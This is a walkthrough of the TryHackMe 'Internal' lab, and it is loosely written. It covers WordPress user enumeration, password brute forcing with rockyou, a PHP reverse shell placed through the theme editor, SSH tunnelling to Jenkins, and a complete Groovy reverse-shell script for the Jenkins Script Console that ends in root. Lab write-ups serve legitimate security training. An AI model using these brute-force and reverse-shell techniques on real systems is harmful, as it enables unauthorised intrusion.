TryHackMe - Internal | Writeup
Room: Internal
Difficulty: Hard
Created : TheMayor
Writeup by: Sourav Mondal1.
ip : 10.10.59.106
domain: internal.thm

Reconnaissance
Nmap Scan....
nmap -sC -sV -T5 -oN nmap.txt 10.10.59.106
Warning: 10.10.59.106 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.59.106
Host is up (0.24s latency).
Not shown: 976 closed tcp ports (conn-refused)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp    open     http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Directory and File Enumeration
dirsearch -u http://10.10.59.106/
01   311B   http://10.10.59.106/blog    -> REDIRECTS TO: [http://10.10.59.106/blog/]
200     2KB  http://10.10.59.106/blog/wp-login.php
200    18KB  http://10.10.59.106/blog/
301   317B   http://10.10.59.106/javascript    -> REDIRECTS TO: http://10.10.59.106/javascript/
301   317B   http://10.10.59.106/phpmyadmin    -> REDIRECTS TO: http://10.10.59.106/phpmyadmin/
200     3KB  http://10.10.59.106/phpmyadmin/doc/html/index.html
200     3KB  http://10.10.59.106/phpmyadmin/
200     3KB  http://10.10.59.106/phpmyadmin/index.php
403   277B   http://10.10.59.106/server-status
403   277B   http://10.10.59.106/server-status/
200     2KB  http://10.10.59.106/wordpress/wp-login.php
404    51KB  http://10.10.59.106/wordpress/

visit http://10.10.59.106/blog/ 
Wordpress 

dirsearch -u http://10.10.59.106/blog/
http://10.10.59.106/blog/wp-admin/
http://10.10.59.106/blog/wp-inludes/

 WPScan to enumerate users
 wpscan --url http://10.10.59.106/blog/ -e
Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <============================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

go to this link
 http://10.10.59.106/blog/wp-admin/
 

 wpscan --url http://internal.thm/blog/wp-login.php -U admin -P/usr/share/SecList/Passwords/Leaked-Databases/rockyou.txt
 
Trying admin / bratz1 Time: 00:08:33 <                                                        > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

we found the admin user’s password. login then Appearance clicking on Theme Editor, we are going to replace the 404.php file with a php reverse shell in order to obtain a reverse shell.
we got reverse shell
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.59.106 58852
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:22:04 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoiam
sh: 1: whoiam: not found
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ 
$ cd home
ls
$ aubreanna
$ cd aubreanna
sh: 4: cd: can't cd to aubreanna
$ sudo su aubreanna
sudo: no tty present and no askpass program specified
$ ls
caubreanna
$ cd ..
sh: 7: ccd: not found
$ cd
ls
$ aubreanna
$ cd /opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

Now that we have successfully accessed another user’s account, try login ssh

ssh aubreanna@10.10.203.102

aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ 
$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:d5ff:fe38:c183  prefixlen 64  scopeid 0x20<link>
        ether 02:42:d5:38:c1:83  txqueuelen 0  (Ethernet)

Docker instance running on the target machine with a 172-series IP address. Consequently, Jenkins is hosted within Docker, running on port 8080 and
SSH tunneling technique to forward the Jenkins IP and port from the target machine to our attacker machine’s IP and port.
Success! Now we can log in to the Jenkins page with the valid credentials: “admin: spongebob”
ssh -L 7878:172.17.0.2:8080 aubreanna@10.10.203.102

To gain access to Jenkins, type localhost:[Port Number]  browser:But we need valid credentials to log in… I googled default credentials for Jenkins, and tried admin: password
i can try brute-force the login page with FFUF. For HTTP login pages.Here is the POST request received in Burp Suite. You can right-click on it and save it on a file as well.

“ffuf -request [file name] -request-proto http -w /usr/share/SecList/Passwords/Leaked-Databases/rockyou.txt

 i found valid credentials: “admin: spongebob”
Now  admin access to Jenkins, we can execute commands and, ultimately, exploit this to establish a reverse shell. To do so, we first need to locate a panel where we can write a reverse shell script. Under ‘Manage Jenkins’ > ‘Tools and Actions,’ there is a ‘Script Console’ where we can create our script.

Pure Groovy/Java Reverse Shell

String host="tun0 ip";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
that you start a Netcat listener before running this command.

-nc -lvnp 4444


note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123


ssh root@10.10.59.106
root@10.10.59.106's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 14 13:11:15 UTC 2025

  System load:  0.0               Processes:              111
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 36%               IP address for eth0:    10.10.59.106
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}






